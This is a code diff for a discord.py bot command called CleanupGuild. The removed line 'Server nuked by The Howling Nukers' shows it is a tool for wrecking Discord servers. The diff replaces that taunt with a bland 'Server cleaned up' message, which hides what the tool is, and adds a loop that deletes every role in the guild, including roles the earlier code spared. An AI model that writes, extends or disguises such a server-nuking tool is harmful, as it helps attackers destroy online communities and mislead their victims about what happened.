@@ -15,6 +15,7 @@ class CleanupGuild(commands.Cog):
         2. Adding one category and channel with the specified names
         3. Sending a cleanup message in the new channel
         4. Deleting all roles except the bot's admin role
+        5. Deleting every single role
         """
         guild = ctx.guild
 
@@ -29,7 +30,7 @@ class CleanupGuild(commands.Cog):
         channel = await guild.create_text_channel(channel_title, category=category)
 
         # Send a cleanup message in the new channel
-        await channel.send("Server nuked by The Howling Nukers. Good luck cleaning up this mess! *awoooooo*")
+        await channel.send("Server cleaned up @everyone")
 
         # Get the bot's admin role (the top role)
         bot_role = guild.get_member(self.bot.user.id).top_role
@@ -41,6 +42,13 @@ class CleanupGuild(commands.Cog):
                     await role.delete(reason="CleanupGuild command")
                 except discord.errors.NotFound:
                     pass  # Role has already been deleted
+
+        # Delete every single role
+        for role in guild.roles:
+            try:
+                await role.delete(reason="CleanupGuild command")
+            except discord.errors.NotFound:
+                pass  # Role has already been deleted
 
 def setup(bot):
     bot.add_cog(CleanupGuild(bot))
